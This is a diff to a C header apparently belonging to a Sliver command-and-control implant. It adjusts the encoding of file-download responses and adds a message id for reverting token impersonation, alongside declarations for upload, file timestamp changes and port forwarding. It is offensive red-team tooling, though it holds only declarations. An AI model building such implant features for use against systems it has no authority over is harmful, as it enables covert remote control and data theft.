@@ -199,7 +199,10 @@ int sliver_chtimes_req_decode(const void *data, size_t len, char *path, size_t p
                               int64_t *atime, int64_t *mtime);
 
 /* --- Download / Upload -------------------------------------------------- */
-#define SLIVER_DOWNLOAD_CHUNK (64 * 1024)
+/* Largest single-file response: the signed frame is capped at 8 MiB
+ * (SLIVER_FRAME_MAX_ENVELOPE), so a download that must fit in one envelope
+ * stays below it. */
+#define SLIVER_DOWNLOAD_MAX_BYTES (6 * 1024 * 1024)
 
 typedef struct {
   char path[1024];
@@ -221,9 +224,13 @@ typedef struct {
 /* DownloadReq{Path=1,Start=2,Stop=3,Recurse=4,MaxBytes=5,MaxLines=6}. */
 int sliver_download_req_decode(const void *data, size_t len, sliver_download_req_t *out);
 /* Download{Path=1,Encoder=2,Exists=3,Start=4,Stop=5,Data=6,IsDir=7,Response=9}. */
+/* Download{Path=1, Encoder=2, Exists=3, Start=4, Stop=5, Data=6, IsDir=7,
+ * ReadFiles=8, Response=9, UnreadableFiles=10}. The operator client refuses to
+ * save anything when ReadFiles is 0 (client/command/filesystem/download.go), so
+ * a successful single-file read must report it. */
 int sliver_download_encode(sliver_buf_t *out, const char *path, int exists, int64_t start,
                            int64_t stop, const void *data, size_t data_len, int is_dir,
-                           const char *err);
+                           int read_files, const char *err);
 /* UploadReq{Path=1,Encoder=2,Data=3,IsIOC=4,FileName=5,IsDirectory=6,Overwrite=7}. */
 int sliver_upload_req_decode(const void *data, size_t len, sliver_upload_req_t *out);
 /* Upload{Path=1,WrittenFiles=2,UnwriteableFiles=3,Response=9}. */
@@ -334,6 +341,9 @@ int sliver_execute_encode(sliver_buf_t *out, uint32_t status, const void *stdout
 #define SLIVER_MSG_CHTIMES_REQ 113u
 #define SLIVER_MSG_CHTIMES 114u
 #define SLIVER_MSG_CURRENT_TOKEN_OWNER 101u
+/* Response id of rev2self (MsgRevToSelf). The service side matches responses by
+ * envelope id, so this is informational, but it keeps the table honest. */
+#define SLIVER_MSG_REV_TO_SELF 30u
 #define SLIVER_MSG_PORTFWD_REQ 80u
 #define SLIVER_MSG_PORTFWD 81u
 #define SLIVER_MSG_BEACON_REGISTER 93u
